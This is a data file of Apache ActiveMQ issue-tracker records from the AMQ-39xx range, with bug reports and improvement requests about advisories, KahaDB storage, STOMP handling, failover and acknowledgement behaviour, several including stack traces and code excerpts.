texts:Failed to fire fast producer advisory, reason: java.lang.NullPointerException
When sending a lot of Messages to Queue via Webconsole and advisdoryForFastProducers="true" (so the advisory triggers)a exception occurs:jvm 1    |  WARN | Failed to fire fast producer advisory, reason: java.lang.NullPointerException2012-07-12 11:40:48,623 | DEBUG | fast producer detail | org.apache.activemq.advisory.AdvisoryBroker | VMTransport: vm://localhost#1java.lang.NullPointerException at org.apache.activemq.advisory.AdvisorySupport.getFastProducerAdvisoryTopic(AdvisorySupport.java:195) at org.apache.activemq.advisory.AdvisoryBroker.fastProducer(AdvisoryBroker.java:352) at org.apache.activemq.broker.BrokerFilter.fastProducer(BrokerFilter.java:275) at org.apache.activemq.broker.BrokerFilter.fastProducer(BrokerFilter.java:275) at org.apache.activemq.broker.MutableBrokerFilter.fastProducer(MutableBrokerFilter.java:286) at org.apache.activemq.broker.region.BaseDestination.fastProducer(BaseDestination.java:512) at org.apache.activemq.broker.region.Queue.send(Queue.java:605) at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:407) at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:503) at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:305) at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) at org.apache.activemq.broker.scheduler.SchedulerBroker.send(SchedulerBroker.java:189) at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96) at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:306) at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135) at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:453) at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:681) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:150) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:231) at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98) at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)
issueID:AMQ-3905
type:Bug
changed files:
texts:Karaf: activemq:create-broker results in only locally visible broker
When I start ActiveMQ with default config on console I get a broker that is visible by other machines as well as the default config uses 0.0.0.0 as publish address. Surprisingly when I embed it inside a Karaf instance the config generated from activemq:create-broker generates a broker that is only visible on my local machine.It would be better, if both default ways would work the same: Also when starting ActiveMQ inside Karaf, it should publish the broker at 0.0.0.0
issueID:AMQ-3906
type:Bug
changed files:
texts:repeated error message regarding chunk stream logged
after running normally for ~24 hours, warning messages/errors like below are logged every 30 seconds:2012-06-27 14:33:31,532 org.apache.activemq.broker.region.Topic[ActiveMQ Broker[ZyrionMessageBus] Scheduler]: (WARN) Failed to browse Topic: remoteUpdateP2PTopicjava.io.EOFException: Chunk stream does not exist, page: 50 is marked free        at org.apache.kahadb.page.Transaction$2.readPage(Transaction.java:460)        at org.apache.kahadb.page.Transaction$2.<init>(Transaction.java:437)        at org.apache.kahadb.page.Transaction.openInputStream(Transaction.java:434)        at org.apache.kahadb.page.Transaction.load(Transaction.java:410)        at org.apache.kahadb.page.Transaction.load(Transaction.java:367)        at org.apache.kahadb.index.BTreeIndex.loadNode(BTreeIndex.java:262)        at org.apache.kahadb.index.BTreeIndex.getRoot(BTreeIndex.java:174)        at org.apache.kahadb.index.BTreeIndex.iterator(BTreeIndex.java:232)        at org.apache.activemq.store.kahadb.MessageDatabase$MessageOrderIndex$MessageOrderIterator.<init>(MessageDatabase.java:2714)        at org.apache.activemq.store.kahadb.MessageDatabase$MessageOrderIndex.iterator(MessageDatabase.java:2696)        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore$3.execute(KahaDBStore.java:525)        at org.apache.kahadb.page.Transaction.execute(Transaction.java:769)        at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.recover(KahaDBStore.java:521)        at org.apache.activemq.store.ProxyTopicMessageStore.recover(ProxyTopicMessageStore.java:62)        at org.apache.activemq.broker.region.Topic.doBrowse(Topic.java:559)        at org.apache.activemq.broker.region.Topic.access$100(Topic.java:62)        at org.apache.activemq.broker.region.Topic$6.run(Topic.java:684)        at org.apache.activemq.thread.SchedulerTimerTask.run(SchedulerTimerTask.java:33)        at java.util.TimerThread.mainLoop(Timer.java:512)        at java.util.TimerThread.run(Timer.java:462)since then the warning has been logged 6000+ times. not sure if this is due to the fact that we have enabled expiration of queued messages for offline subscribers.% ls -l apps/activemq/data/kahadb/total 32068-rw-r--r-- 1 root root 33030144 2012-06-29 14:44 db-14.log-rw-r--r-- 1 root root   339968 2012-06-29 14:44 db.data-rw-r--r-- 1 root root   196984 2012-06-29 14:44 db.redo-rw-r--r-- 1 root root        0 2012-06-26 16:40 lock
issueID:AMQ-3908
type:Bug
changed files:
texts:StompSslAuthTest.testSubscribeWithReceiptNotAuthorized() fails
The StompSslAuthTest.testSubscribeWithReceiptNotAuthorized() fails at the following assertion:frame = stompConnection.receiveFrame();assertTrue(frame.startsWith("ERROR"));The frame it actually gets is:RECEIPTreceipt-id:1Note: this testcase succeeds when run as part of StompTest.
issueID:AMQ-3909
type:Bug
changed files:
texts:Messages sometimes not received by active topic subscriptions
A consumer subscribe over stomp or a failover of a consumer can lead to a scenario in which messages are not delivered to consumers on Topics.  There is a small window in which the consumer subscribe and consumer update of prefetch during failover and a Stomp consumer subscribe when messages might be produced but the subscription is not sent those messages.  Once a new Message is produced after the ConsumerControl command updates the prefetch then pending messages are dispatched.  The Topic and DurableTopic subscription classes need to do an eager dispatch after the prefetch size is updated to ensure pending message that were held because the window was to small are dispatched in a timely manner.
issueID:AMQ-3912
type:Bug
changed files:
texts:Durable subs store messages in error with broker attribute persistent="false"
persistent="false" means use only the memory persistence adapter, ignore the persistence attribute of a message or durable sub.If a <persistenceAdapter /> element is specified in xml config, durable subs do get persistence of messages that will survive a restart. This is not the intent of persistent="false"
issueID:AMQ-3913
type:Improvement
changed files:StompWireFormat.java
texts:Stomp Spec allows for stomp headers to have spaces in key or value we currently trim.
The spec specification allows for spaces to exists at either end of a message header key or value.  We currently trim the header keys in order to be forgiving of clients that don"t adhere to the this and send odd keys with space padding, we should now stop this and align more closely to spec compliant behavior.  This means some clients could see some oddness if they don"t also ensure that keys we are looking for like "destination" etc are not correctly formated on send.
issueID:AMQ-3914
type:Improvement
changed files:
texts:Add support for MS SQL JDBC driver 4.0
When using MS SQL JDBC Driver version 4.0 ActiveMQ can"t find a "Database adapter driver override" as it does with version 3.0 of the driver.Version 4.02012-07-06 09:50:33,639 | INFO  | Database adapter driver override not found for : [microsoft_jdbc_driver_4_0_for_sql_server].  Will use default implementation. | org.apache.activemq.store.jdbc.JDBCPersistenceAdapter | WrapperSimpleAppMain2012-07-06 09:50:33,639 | INFO  | Database lock driver override not found for : [microsoft_jdbc_driver_4_0_for_sql_server].  Will use default implementation. | org.apache.activemq.store.jdbc.JDBCPersistenceAdapter | WrapperSimpleAppMainVersion 3.02012-07-06 10:09:37,322 | INFO  | Database adapter driver override recognized for : [microsoft_sql_server_jdbc_driver_3_0] - adapter: class org.apache.activemq.store.jdbc.adapter.TransactJDBCAdapter | org.apache.activemq.store.jdbc.JDBCPersistenceAdapter | WrapperSimpleAppMain2012-07-06 10:09:37,322 | INFO  | Database lock driver override recognized for : [microsoft_sql_server_jdbc_driver_3_0] - adapter: class org.apache.activemq.store.jdbc.adapter.TransactDatabaseLocker | org.apache.activemq.store.jdbc.JDBCPersistenceAdapter | WrapperSimpleAppMain
issueID:AMQ-3915
type:Bug
changed files:ManagementContext.java
texts:JMX connector does not bind to a specific host when a connectHost is specified on the managementContext
Due to JDK bug (http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=6425769), JMX connector will listen on all interfaces, instead of one defined by connectorHost property. There"s a workaround for the problem that we can use.
issueID:AMQ-3917
type:New Feature
changed files:
texts:ActiveMQ should support multiple durable subscriptions per Stomp client
This is coming from AMQ-3802.Quoting Timothy - "This is another limitation of the Stomp support which allows for only one durable subscription since clientId and subscription name are linked. This is because the Stomp v1.0 spec didn"t require that you assign unique Ids to subscriptions, so the correlation is made per connection using the matching clientId and subscription name. You can work around this by creating a connection for each durable subscriber."Now, since ActiveMQ v5.6.0 supports Stomp v1.1 which has made the id header mandatory for subscribe and unsubscribe calls, we should leverage this feature and allow for multiple durable subscriptions per stomp client. Hacks like creating a separate connection for each durable subscriber should be avoided.Let me know if you have any queries?Thanks,Bhanu
issueID:AMQ-3918
type:Improvement
changed files:TransportConnector.java
WebTransportServerSupport.java
pom.xml
WSTransportServer.java
HttpTransportServer.java
texts:Expose transport connector URIs in uniform fashion
Right now we have JMX methods like getOpenWireURL() for getting addresses of transport connectors. This API is not particularly nice and doesn"t scale well when new transports are added.So we should deprecate these methods and introduce new ones: Map<String, String> getTransportConnectors() - that returns all connectors with name as a key public String getTransportConnectorByType(String type) - that returns a connector address for a certain prefix/type (like tcp, stomp, ws and such)
issueID:AMQ-3920
type:Bug
changed files:DestinationBridge.java
texts:Performance issue with delay policy in DestinationBridge.onMessage
Incorrect sleep implementation in org.apache.activemq.network.jms.DestinationBridge.onMessageIn the current implementation the condition "attempt > 0" is true during the first iteration. It causes critical performance problems in high load environment.Code example from DestinationBridge.onMessage:...while (started.get() && message != null && ++attempt <= maxRetries) {            try {                if (attempt > 0) {//IT"S TRUE DURING FIRST ITERATION                    try {                       Thread.sleep(jmsConnector.getReconnectionPolicy().getNextDelay(attempt));                    } catch(InterruptedException e) {                        break;                    }                }...
issueID:AMQ-3921
type:Bug
changed files:Topic.java
texts:Duplicated durable subscriptions after broker retart with option keepDurableSubsActive=true
In a slightly modified version of JUnit test case org.apache.activemq.usecases.DurableSubscriptionActivationTest from activemq-core there will be a failure because reactivated subscription with the same SubscriptionName and ClientID after broker restart was not correctly recognized and as a result, a duplicated durable subscriptions was added to consumers list.
issueID:AMQ-3922
type:Bug
changed files:HsqldbJDBCAdapter.java
texts:HSQLDB support is broken as wrong data type is used in HsqldbJDBCAdapter.java
The HsqldbJDBCAdaptor defines the SQL type used for storing a lob as "OTHER". This is wrong in principle, as this type is intended for storing complex serialized objects, not specifically lobs. With this type, the JDBC setObject and getObject methods must be used to store and retrieve the object (which is not the case with ActiveMQ).The problem has been encountered and reported in TOMEE-233 and elsewhere.With HSQLDB version 2.x, the type "BLOB" should be used for maximum storage capacity and minimum memory use by the database engine. This type is supported in all modes of operation, including in-memory and file databases.It seems a simple switch from "OBJECT" to "BLOB" in the code should do the job, as the JDBC setBytes and getBytes methods used by the superclass are compatible with the BLOB type.
issueID:AMQ-3923
type:Bug
changed files:
texts:Webconsole should import javax.servlet.* too
When the Active MQ Web-console is deployed on Karaf it sometimes misses the CSS and javascript. This is due to the fact that the war doesn"t import javax.servlet package. This is required per OSGi-Spec to fully work with theweb-extender for wars
issueID:AMQ-3924
type:New Feature
changed files:
texts:Allow REST API to connect to the secured broker
We should be able to connect to the secured broker using REST API. The idea mechanism for that would be reusing Authorization header in HTTP request that is used to secure web servers. The format of the header isAuthorization: Basic base64(username:password)and that could be supplied by turning on basic auth on Jetty, or set directly by the http client.
issueID:AMQ-3927
type:Bug
changed files:
texts:can&#39;t connect to stomp protocol 1.1 using telnet
Using telnet I can"t connect to stomp protocol 1.1. netcat works fineholla@knopfler&#91;507&#93;: telnet eric 61613Connected to eric.Escape character is "^]".CONNECTaccept-version:1.1heart-beat:0,0^@   ERRORcontent-type:text/plain], supported versions are: &#91;1.1, 1.0&#93;], supported versions are: &#91;1.1, 1.0&#93;rotocolException: Invalid Protocol version[1.1        at org.apache.activemq.transport.stomp.ProtocolConverter.onStompConnect(ProtocolConverter.java:586)        at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:181)        at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:76)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:222)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:204)        at java.lang.Thread.run(Thread.java:619)Connection closed by foreign host.holla@knopfler&#91;508&#93;: nc eric 61613Trying 75.101.139.42...^Cholla@knopfler&#91;509&#93;: nc eric 61613CONNECTaccept-version:1.1heart-beat:0,0^@CONNECTEDheart-beat:0,0session:ID:eric-51104-1342368411805-2:16server:ActiveMQ/5.7-SNAPSHOTversion:1.1I suspect the telnet induced CR or LF isn"t stripped correctly. You can see this because the error message formatting is screwed up.
issueID:AMQ-3929
type:Bug
changed files:
texts:STOMP multiple header handling incorrect per the 1.1 spec
None
issueID:AMQ-3930
type:Bug
changed files:
texts:DataFileNotDeletedTest.testForDataFileNotDeletedTransacted() fails intermittently
This test will usually pass if you run it individually, and will usually fail if you run the suite.  (which contains only one other test)I will attach surefire-reports files
issueID:AMQ-3932
type:Bug
changed files:
texts:receiveNoWait hangs when broker is down, using failover and prefetch=0
I have a connection set up using failover and queuePrefetch=0.  I create a consumer, stop the broker, and call receiveNoWait.I would expect this to return/throw immediately; instead it hangs.  Without failover or with a non-zero prefetch it works as expected.
issueID:AMQ-3934
type:Bug
changed files:
texts:QueueViewMBean.getMessage throws NullPointerException when message not found
When calling QueueViewMBean.getMessage(String messageID), a NullpointerException is thrown from QueueView.java:40 when the message is not found on the queue. Adding a nullcheck in QueueView.getMessage(String messageID) fixes the issue.
issueID:AMQ-3935
type:Bug
changed files:Queue.java
texts:JConsole browse() function does not work if useCache=false
Doing a send of 20 messages in batches of 10, and a browse in between via jconsole with policy entry useCache=false, the browse does not return 20 messages on the second call.When a consumer does a browse, because there are some consumers in the mix, a page in occurs. Via jmx, there are no consumers b/c jmx goes direct to the queue via the mbean.The problem is that the browse does not force a page in from disk. So if the messages are not cached they are not visible.Ensuring that a browse does page in if the cache is disabled will sort this.
issueID:AMQ-3939
type:Bug
changed files:
texts:FailoverTransport never closes backup connections
When creating a FailoverTransport and setting backup=true and randomize=false, the failover transport creates the backup connections as expected but does not close them upon stop().  The same thing happens with priorityBackup=true.
issueID:AMQ-3940
type:Improvement
changed files:MessageServlet.java
texts:REST API - support application/json response type
Currently we always return text/xml. Make it configurable.
issueID:AMQ-3944
type:Task
changed files:
texts:Test against the Joram JMS conformance tests.
None
issueID:AMQ-3945
type:Sub-task
changed files:
texts:QueueBrowser missing messages on first browse.
If messages are added to queue after a queue browser is created but before browser.getEnumeration() is called those messages will not get included in the browse.
issueID:AMQ-3947
type:Sub-task
changed files:
texts:ActiveMQConnectionFactory doesn&#39;t set the nestedMapAndListEnabled property on new Connections
The property nestedMapAndListEnabled controls whether JMS Message properties can contained sub Lists and Maps but its no propagated to the Connections created by the ConnectionFactory so it can"t be globally disabled.
issueID:AMQ-3950
type:Improvement
changed files:
texts:Blueprint version should be [0.3,2)
Currently the range [0.3,1) is imported into activemq-blueprint. As aries blueprint 1.0.0 is released and it is compatible with the 0.x version the range should be [0.3,2).
issueID:AMQ-3953
type:Bug
changed files:
texts:org.apache.activemq.util.URISupport.isCompositeURI doesn&#39;t work properly.
URISupport.isCompositeURI(URI uri) is not implemented correctly. It doesn"t work for the cases when a scheme part contains "//" (double slashes). In the simple test where a failover uri contains two url"s: failover://(tcp://bla:61616,tcp://bla:61617)} and is the composite URI, URISupport.isCompositeURI(uri) returns false... The general problem is that the definition of a "composite URI" is pretty loose and is not defined formally... According to http://activemq.2283324.n4.nabble.com/composite-uri-td4654365.html uri is composite if the scheme is followed by (..)Please, find attached unit test patch and, possible fix based on assumption that parentheses is a criteria...
issueID:AMQ-3954
type:Bug
changed files:
texts:Intended delivery mode for JMSUsecaseTest is not tested
The JMSUsecaseTest clearly intends to test non-persistent delivery, but nowhere in the test is it actually doing that. Turn the logging to trace and watch that the messages are always being sent persistent even in the non-peristent tests.
issueID:AMQ-3955
type:Bug
changed files:StompSocket.java
texts:WebSocket Transport - Race condition starting transport
In the StompServlet, when a websocket request comes in, we are starting up the broker"s websocket connection when we call listener.onAccept(socket). Under the covers, it begins a task in a new thread to create the connection, instantiate the transport listener, and set the listener on the transport. However, this is done asynchronously, and when the StompServlet calls listener.onAccept(socket), it immediately returns to the underlying jetty websockets implementation, returning the StompSocket (which as the websocket onTextMessage listener). It seems it"s possible the jetty code could call back the onTextMessage listener"s onMessage(...) method and expect the StompSocket to process the Stomp message before the steps taken to complete creating the connection from the async listener.onAccept(..) call.
issueID:AMQ-3956
type:Bug
changed files:
texts:KahaDB pagefile (db.data) steady growth - BTreeIndex page leak
There is a page leak in the kahadb BTeeIndex that can result in the pagefile (db.data) growing steadily. One use case that can reproduce is with durable subs that repeatedly subscribe and unsubscribe with pending messages.The problem can occur with particular usage of any btree index so the problem is not confined to durable subs.
issueID:AMQ-3958
type:Bug
changed files:
texts:META-INF/spring.schemas does not contain a reference to 5.6.0 schema
The reference to 5.6.0 schema should also be included in spring.schemas file:http://activemq.apache.org/schema/core/activemq-core-5.6.0.xsd=activemq.xsd
issueID:AMQ-3960
type:Improvement
changed files:
texts:Update 5.7 to use Apache Camel 2.10.x
None
issueID:AMQ-3961
type:Bug
changed files:
texts:Durable subscriber only receives part of the persisted messages on re-connect
A durable subscriber is connected to ActiveMQ using the ConnectionConsumer protocol, transacted sessions, and at most 1 message per session. While the subscriber is disconnected, the publisher publishes e.g. 10 messages. When the subscriber re-connects, it only receives 2 messages of those. If it repeatedly disconnects and re-connects, it receives 2 messages each time until all messages are received.Further investigation reveals that the problem lies in class org.apache.activemq.broker.region.PrefetchSubscription which does not re-check for further pending messages to be dispatched when committed message are removed from the list of dispatched but not yet acknowledged messages.
issueID:AMQ-3965
type:Bug
changed files:
texts:Expired msgs not getting acked to broker causing consumer to fill up its prefetch and not getting more msgs.
It is possible to get a consumer stalled and not receiving any more messages when using optimizeAcknowledge.Let me illustrate in an example (JUnit test attached).Suppose a consumer with optimizeAcknowledge and a prefetch of 100 msgs.The broker"s queue contains 105 msg. The first 45 msgs have a very low expiry time, the remaining don"t expiry. So the first 100 msgs get dispatched to the consumer (due to prefetch=100). Out of these the first 45 msgs do not get dispatched to consumer code because their expiry has elapsed by the time that are handled in the client. ActiveMQMessageConsumer.javapublic void dispatch(MessageDispatch md) {        MessageListener listener = this.messageListener.get();        try {            [...]            synchronized (unconsumedMessages.getMutex()) {                if (!unconsumedMessages.isClosed()) {                    if (this.info.isBrowser() || !session.connection.isDuplicate(this, md.getMessage())) {                        if (listener != null && unconsumedMessages.isRunning()) {                            ActiveMQMessage message = createActiveMQMessage(md);                            beforeMessageIsConsumed(md);                            try {                                boolean expired = message.isExpired();                                if (!expired) {                                    listener.onMessage(message);                                }                                afterMessageIsConsumed(md, expired);listener.onMessage() above is not called as the msg has expired. However it will calls into afterMessagesIsConsumed()ActiveMQMessageConsumer.java    private void afterMessageIsConsumed(MessageDispatch md, boolean messageExpired) throws JMSException {      [...]        if (messageExpired) {            synchronized (deliveredMessages) {                deliveredMessages.remove(md);            }            stats.getExpiredMessageCount().increment();            ackLater(md, MessageAck.DELIVERED_ACK_TYPE);and will remove the expired msg from the deliveredMessages list. It then calls into ackLater(). However ackLater() only fires an ack back to the broker when the number of unsent acks has reached 50% of the prefetch value.ActiveMQMessageConsumer.java private void ackLater(MessageDispatch md, byte ackType) throws JMSException {    [...]    if ((0.5 * info.getPrefetchSize()) <= (deliveredCounter - additionalWindowSize)) {            session.sendAck(pendingAck);        In our example it has not reached that mark (only 45 expired msgs, i.e. 45%). So the first 45 msgs, which expired before being dispatched, did not cause an ack being sent to the broker.Now the next 55 messages get processed. These don"t have an expiry so they get dispatched to consumer code. After dispatching each msg to the registered application code, we call into afterMessageIsConsumed() but this time executing a different branch as the msgs are not expiredActiveMQMessageConsumer.javaprivate void afterMessageIsConsumed(MessageDispatch md, boolean messageExpired) throws JMSException {    [...]    else if (isAutoAcknowledgeEach()) {                if (deliveryingAcknowledgements.compareAndSet(false, true)) {                    synchronized (deliveredMessages) {                        if (!deliveredMessages.isEmpty()) {                            if (optimizeAcknowledge) {                                ackCounter++;                                if (ackCounter >= (info.getPrefetchSize() * .65) || (optimizeAcknowledgeTimeOut > 0 && System.currentTimeMillis() >= (optimizeAckTimestamp + optimizeAcknowledgeTimeOut))) {                                    MessageAck ack = makeAckForAllDeliveredMessages(MessageAck.STANDARD_ACK_TYPE);                                    if (ack != null) {                                        deliveredMessages.clear();                                        ackCounter = 0;                                        session.sendAck(ack);                                        optimizeAckTimestamp = System.currentTimeMillis();                                    }                                }with optimizeAcknowledge=true we only send an ack back to the broker if either optimizeAcknowledgeTimeOut has elapsed or the ackCounter has reached 65% of the prefetch (100). The timeout will not have kicked in. The ackCounter will be at 55 after processing the last of 100 prefetched messages which is less than 65% of 100. So with the last prefetched msg being processed, it will not generate an ack back to the broker. As a result, the client has processed all prefetched message and will not get any new messages dispatched from the broker. The broker has another 5 msgs on the queue but since it never received an ack from the client, it won"t dispatch any further messages. The client is stalled.
issueID:AMQ-3967
type:Sub-task
changed files:
texts:ActiveMQJmsHeaderRouteTest doesn&#39;t work with Apache Camel 2.10
activemq-camel/src/test/java/org/apache/activemq/camel/component/ActiveMQJmsHeaderRouteTest.java  - is currently excluded from tests
issueID:AMQ-3972
type:Improvement
changed files:FailoverTransport.java
texts:Add an &#39;isDisposed&#39; check before calling &#39;propagateFailureToExceptionListener&#39; in FailoverTransport
In order to prevent erroneous logging on shut-down change to line 268 to: } else if(!isDisposed()){in org.apache.activemq.transport.failover.FailoverTransport.
issueID:AMQ-3973
type:Bug
changed files:
texts:data.db size is not included in calculation to monitor systemUsage settings
Index size is not currently included in kahadb store size calculation.
issueID:AMQ-3976
type:Bug
changed files:ActiveMQMessageProducer.java
texts:ActiveMQMessageProducer::send uses == instead of equals to compare destinations
In method   send(Destination destination, Message message, int deliveryMode, int priority, long timeToLive)The comparison destination == info.getDestination() in line 205 seems wrong.I think that destination.equals(info.getDestination()).Otherwise you get an exception "This producer can only send messages to QUEUE", even when both destination  and info.getDestination() point to the same queue.
issueID:AMQ-3979
type:Bug
changed files:MessageListenerServlet.java
texts:AjaxServlet preventing Tomcat Container from shutting down.
org.apache.activemq.web.MessageListenerServlet start non daemon thread that prevents web container to shutdown properly.
issueID:AMQ-3980
type:Improvement
changed files:
texts:Websocket transport: support increasing the max size of websocket messages
Currently the the max size is hard-coded jetty value of 16k. We should support tuning it using url transport options, like<transportConnector name="ws" url="ws://localhost:61614?transport.maxTextMessageSize=99999"/>
issueID:AMQ-3981
type:Bug
changed files:ActiveMQSslConnectionFactory.java
texts:ActiveMQSslConnectionFactory.java now has apache commons dependency
As of 5.6 ActiveMQSslConnectionFactory.java imports apache commons and creates an instance of LogFactory forcing the use or inclusion of apache commons logger when using SSL connections.
issueID:AMQ-3982
type:Bug
changed files:
texts:Overlapping PList iterators can read wrong data or throw exceptions about chunk streams not existing.
When multiple PList iterators are in use and happen have an overlapping read of PageFile data on disk they can reset each others seek offset and cause an exception to be thrown about "chunk stream does not exist" or read of a page in the Free list.  The reason is that the hasNext of PList iterator needs to by sync"d on the index lock to prevent two iterators from entering into a readPage call concurrently.
issueID:AMQ-3983
type:Improvement
changed files:
texts:Fix osgi dependency
Upgrade osgi core dependency to line with camel and make it provisioned
issueID:AMQ-3985
type:Bug
changed files:
texts:ActiveMQConnection temp advisory consumer should use asyncDispatch - can cause deadlock with slow consumers
A slow or blocked connection with the default temp advisory consumer can cause operations that create advisories to block b/c the dispatch is sync to that advisory consumer. If the block occurs after the prefetch is filled the broker stores pending messages and the problem is avoided, but if the block occurs before the prefetch is reached, the dispatch is attempted in the calling thread, which blocks the originating operation. not good.The solution is to always request async dispatch for the temp advisory consumer in a client connection.
issueID:AMQ-3986
type:Improvement
changed files:ActiveMQConnectionRequestInfo.java
ActiveMQConnectionSupport.java
texts:Allow optimizeDurableTopicPrefetch to be set using resource adapter properties
None
issueID:AMQ-3988
type:Bug
changed files:ActiveMQSession.java
texts:PooledSession throw Exception at closing
Using ActiveMQ library 5.6.0 with Camel 2.10, the PooledSession is throwing IllegalStateException at shutdown application time.With the version 5.4.2 of ActiveMQ library there is not such behavior.2012-08-23 12:08:48,274 [WARN] PooledSession(122): Caught exception trying close() when putting session back into the pool, will invalidate. javax.jms.IllegalStateException: The Session is closed javax.jms.IllegalStateException: The Session is closed at org.apache.activemq.ActiveMQSession.checkClosed(ActiveMQSession.java:731) ~[activemq-core-5.6.0.jar:5.6.0] at org.apache.activemq.ActiveMQSession.setMessageListener(ActiveMQSession.java:813) ~[activemq-core-5.6.0.jar:5.6.0] at org.apache.activemq.pool.PooledSession.close(PooledSession.java:99) ~[activemq-pool-5.6.0.jar:5.6.0] at org.springframework.jms.support.JmsUtils.closeSession(JmsUtils.java:108) [spring-jms-3.0.7.RELEASE.jar:3.0.7.RELEASE] at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.clearResources(DefaultMessageListenerContainer.java:1099) [spring-jms-3.0.7.RELEASE.jar:3.0.7.RELEASE] at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.run(DefaultMessageListenerContainer.java:999) [spring-jms-3.0.7.RELEASE.jar:3.0.7.RELEASE] at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) [na:1.6.0_33] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) [na:1.6.0_33] at java.lang.Thread.run(Thread.java:680) [na:1.6.0_33]Pool Connection Declaration: <bean id="jmsConnectionFactory" class="org.apache.activemq.ActiveMQConnectionFactory">  <property name="brokerURL" value="${amq.url}" />  <property name="userName" value="${amq.username}" />  <property name="password" value="${amq.password}" />  <property name="watchTopicAdvisories" value="${amq.watchTopicAdv}" /> </bean> <bean id="pooledConnectionFactory" class="org.apache.activemq.pool.PooledConnectionFactory">  <property name="maxConnections" value="${amq.maxConnections}" />  <property name="maximumActive" value="${amq.maximumActive}" />  <property name="connectionFactory" ref="jmsConnectionFactory" /> </bean> <bean id="jmsConfig" class="org.apache.camel.component.jms.JmsConfiguration">  <property name="connectionFactory" ref="pooledConnectionFactory" />  <property name="transacted" value="false" />  <property name="testConnectionOnStartup" value="true" />  <property name="concurrentConsumers" value="${amq.concurrentConsumers}" /> </bean> <bean id="activemq" class="org.apache.activemq.camel.component.ActiveMQComponent">  <property name="configuration" ref="jmsConfig" /> </bean>Maven Dependencies:  <dependency>   <groupId>org.apache.activemq</groupId>   <artifactId>activemq-camel</artifactId>   <version>5.6.0</version>  </dependency>  <dependency>   <groupId>org.apache.activemq</groupId>   <artifactId>activemq-pool</artifactId>   <version>5.6.0</version>  </dependency>
issueID:AMQ-3989
type:Bug
changed files:
texts:ActiveMQSslConnectionFactory.setKeyAndTrustManagers does not work with failover enabled using 5.7 snapshot Jars
I"ve been using ActiveMQ with SSL enabled for months now. After enabling failover on the broker and connecting using a failover URL I get this error:certificate_unknownI find two workaround: one using System.setProperty, the other using Thread.setSslContext. But these are workarounds and I"d rather do things the appropriate way. This is similar to the issue posted in this JIRA:https://issues.apache.org/jira/browse/AMQ-3785. The issue is marked as resolved but I am still getting that error using 5.7 snapshot Jars.I"ll attach a zip file containing very simple code and test case.
issueID:AMQ-3991
type:Improvement
changed files:BrokerService.java
texts:Output version number in started log line to be consistent
AMQ logs when its starting, and later when it has started. Only the 1st log line has the version number. It would be good to have the version number in the 2nd line as well.[                          main] BrokerService                  INFO  ActiveMQ 5.6.0 JMS Message Broker (mybroker) is starting[                          main] BrokerService                  INFO  For help or more information please see: http://activemq.apache.org/[                 JMX connector] ManagementContext              INFO  JMX consoles can connect to service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmi[                          main] TransportServerThreadSupport   INFO  Listening for connections at: tcp://127.0.0.1:61616[                          main] TransportConnector             INFO  Connector tcp://localhost:61616 Started[                          main] BrokerService                  INFO  ActiveMQ JMS Message Broker (mybroker, ID:davsclaus.lan-54124-1345820752143-0:1) startedAnd for stopping the broker the version number is no longer included. That would be good to have, to be consistent.[         ActiveMQ ShutdownHook] BrokerService                  INFO  ActiveMQ Message Broker (mybroker, ID:davsclaus.lan-54124-1345820752143-0:1) is shutting down[cp://localhost/127.0.0.1:61616] FailoverTransport              WARN  Transport (tcp://127.0.0.1:61616) failed, reason:  java.io.EOFException, attempting to automatically reconnect[cp://localhost/127.0.0.1:61616] FailoverTransport              WARN  Transport (tcp://127.0.0.1:61616) failed, reason:  java.io.EOFException, attempting to automatically reconnect[cp://localhost/127.0.0.1:61616] FailoverTransport              WARN  Transport (tcp://127.0.0.1:61616) failed, reason:  java.io.EOFException, attempting to automatically reconnect[cp://localhost/127.0.0.1:61616] FailoverTransport              WARN  Transport (tcp://127.0.0.1:61616) failed, reason:  java.io.EOFException, attempting to automatically reconnect[         ActiveMQ ShutdownHook] TransportConnector             INFO  Connector tcp://localhost:61616 Stopped[cp://localhost/127.0.0.1:61616] FailoverTransport              WARN  Transport (tcp://127.0.0.1:61616) failed, reason:  java.io.EOFException, attempting to automatically reconnect[         ActiveMQ ShutdownHook] BrokerService                  INFO  ActiveMQ JMS Message Broker (mybroker, ID:davsclaus.lan-54124-1345820752143-0:1) stopped
issueID:AMQ-3992
type:Bug
changed files:
texts:Zero Prefetch consumers increment the Enqueue Counter when the pull times out
